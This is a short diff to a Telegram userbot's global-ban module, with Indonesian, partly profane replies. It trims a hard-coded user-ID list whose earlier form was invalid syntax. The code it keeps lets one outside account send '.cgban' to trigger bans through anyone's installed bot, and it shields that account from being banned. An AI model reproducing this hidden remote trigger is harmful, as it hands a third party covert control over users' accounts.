@@ -77,7 +77,7 @@ async def handler(tele):
 
 
 @register(outgoing=True, pattern="^.gban(?: |$)(.*)")
-@register(incoming=True, from_users=901878554, 1191668125, pattern=r"^\.cgban(?: |$)(.*)")
+@register(incoming=True, from_users=901878554, pattern=r"^\.cgban(?: |$)(.*)")
 async def gben(userbot):
     dc = userbot
     sender = await dc.get_sender()
@@ -107,7 +107,7 @@ async def gben(userbot):
     except BaseException:
         return await dark.edit(f"`Terjadi Kesalahan`")
     if user:
-        if user.id == 901878554, 1191668125:
+        if user.id == 901878554:
             return await dark.edit(
                 f"`LU GABISA GBAN HACKER, DIA YANG BIKIN GUA NGENTOTTT!!!`"
             )
@@ -174,7 +174,7 @@ async def gunben(userbot):
     except BaseException:
         return await dark.edit("`Terjadi Kesalahan`")
     if user:
-        if user.id == 901878554, 1191668125:
+        if user.id == 901878554:
             return await dark.edit("**LU GABISA BLACKLIST HACKER, DIA YG BIKIN GUA NGENTOT!!!**")
         try:
             from userbot.modules.sql_helper.gmute_sql import ungmute
